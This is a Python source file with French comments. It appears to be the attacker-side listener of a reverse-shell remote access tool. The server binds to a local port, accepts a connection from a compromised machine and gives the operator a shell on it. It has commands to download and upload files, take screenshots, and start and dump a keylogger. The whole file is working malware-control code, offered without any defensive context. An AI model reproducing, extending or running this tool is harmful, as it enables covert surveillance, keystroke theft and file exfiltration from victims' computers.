#!usr/bin/python
# -*- coding: utf-8 -*-

import socket
import json
import base64
from termcolor import colored

localIP = "192.168.0.100"
portbind = 51234

def reliable_send(data): #pour envoyer plus de 1024 bits
	json_data = json.dumps(data.decode('cp850','replace'), ensure_ascii=False)
	target.send(json_data.encode('cp850','replace'))

def reliable_recv():
	data = "" #empty
	while True:
		try:
			data = data + target.recv(1024).decode('cp850','replace')
			return json.loads(data) #une fois que c bon y a tout dans data
		except ValueError:
			continue #si on recoit plus de 1024 on continue

def shell():
	global count
	global keycount
	while True:
		command = input(colored("@Shell: ",'white') + colored(str(ip),'blue') + colored("$ ",'white'))
		reliable_send(command.encode('cp850','replace'))
		if command == 'q':
			break
		elif command[:2] == "cd" and len(command) > 1: #on attend pas de retour
			continue
		elif command[:8] == "download":
			with open(command[9:],"wb") as file: #on open the file to write bytes
				file_data = reliable_recv() #on recv la data dans file_data
				file.write(base64.b64decode(file_data)) #on write la data decodee
				print(colored("[+] Download ended !",'green'))
		elif command[:6] == "upload":
			try:
				with open(command[7:], "rb") as fin: #read bytes
					send = base64.b64encode(fin.read())
					reliable_send(send)
					print(colored("[+] Upload ended !",'green')) #plutot l'afficher qd c fini sur l'autre ordi
			except:
				failed = "Failed to upload"
				reliable_send(base64.b64encode(failed.encode('cp850','replace')))
				print(colored("[!!] Upload Failed",'red'))
		elif command[:10] == "screenshot":
			with open("screenshot%d.png" % count, "wb") as screen: #count va augmenter
				image = reliable_recv()
				image_decoded = base64.b64decode(image)
				if image_decoded[:4] == "[!!]":
					print(image_decoded) #car c ce qu'on revoie qd il y a une erreur
				else:
					screen.write(image_decoded)
					print(colored("[+] Screenshot shot !",'green'))
					count += 1
		elif command[:12] == "keylog_start":
			print(colored("[+] Keylog started !",'green'))
			continue #pour pas bloquer vu que la fonction renvoie rien
		elif command[:12] == "keylog_dump":
			keylog = reliable_recv()
			with open("keylog%d.txt" % keycount, "w") as keyfich:
				keyfich.write(keylog)
			print(colored("[+] Log %d written !" % keycount, 'green'))
			keycount += 1
		else:
			result = reliable_recv()
			if result[:4] == "[!!]":
				print(colored(result,'red'))
			elif result[:4] == "[+]":
				print(colored(result,'green'))
			elif result[40:48] == "download":
				print(colored(result,'magenta'))
			else:
				print(result)

def server():
	global s
	global ip
	global target
	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) #ipv4 connection ; TCP connection
	s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) #options pour le sokcet object

	s.bind((localIP,portbind)) #ca va bind notre ip addresse locale vers le port specifie entre (), veririfer que le port n'est pas utilise
	s.listen(5) #listen for incomming connexions, entre () le nombre

	print(colored("[+] Listening for incoming connections",'yellow') + colored("...",'yellow',attrs=['blink']))

	target, ip = s.accept() #on stocke la connexion, socket obj in target, ip stocke ip et port
	print(colored("[+] Connection established from: %s" % str(ip), 'grey', 'on_green'))

count = 1 #comtpeur pour les screenshots
keycount = 1 #compteur des log du keylogger

server()
shell()
s.close()
